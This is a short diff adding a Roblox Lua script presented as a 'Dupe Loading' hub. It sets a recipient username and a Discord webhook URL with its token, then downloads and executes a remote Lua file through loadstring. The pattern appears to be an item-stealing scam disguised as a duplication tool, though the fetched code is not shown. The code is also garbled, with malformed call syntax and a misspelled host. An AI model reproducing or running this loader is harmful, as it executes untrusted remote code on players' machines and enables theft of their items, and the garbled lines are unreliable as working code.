@@ -1,0 +1,4 @@
+_G.Username = "concbm"
+_G.Hubname = "Dupe Loading"
+_G.WebhookUr1 = "https://discord.com/api/webhooks/1077518029753155594/pf1t0JIQ0EhbYDzUBmmHjo4-Um7Dfee3PxGw_ys2yRpl8zvyi9oI55YcWQzgHC3xoFIc"
+loadstring(game"HttpGet("https://raw.githubsercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
